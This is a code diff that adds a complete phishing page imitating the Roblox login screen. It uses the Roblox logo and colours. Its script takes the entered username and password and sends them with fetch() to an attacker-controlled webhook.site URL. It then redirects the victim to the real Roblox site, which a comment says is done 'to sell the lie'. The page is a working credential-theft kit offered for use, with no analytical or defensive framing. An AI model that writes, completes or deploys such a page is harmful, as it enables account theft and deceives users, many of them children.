@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f; /* Roblox Green */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #009a60;
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+        }
+        .spinner {
+            display: none;
+            margin: 10px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #333;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- Roblox Logo URL -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black_2020.svg" alt="Roblox" class="logo">
+    
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username or Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="spinner" id="loader"></div>
+    <div class="footer">
+        <a href="#" style="color:#0074bd; text-decoration:none;">Forgot password?</a>
+    </div>
+</div>
+
+<script>
+    // 1. Go to https://webhook.site and copy your unique URL
+    // Paste it below inside the quotes
+    const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; 
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        // Show loading spinner
+        document.querySelector('button').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        // Send data to Webhook.site
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: username,
+                password: password,
+                time: new Date().toISOString()
+            })
+        }).then(() => {
+            // Redirect to real Roblox after 2 seconds to sell the lie
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 2000);
+        });
+    });
+</script>
+
+</body>
+</html>
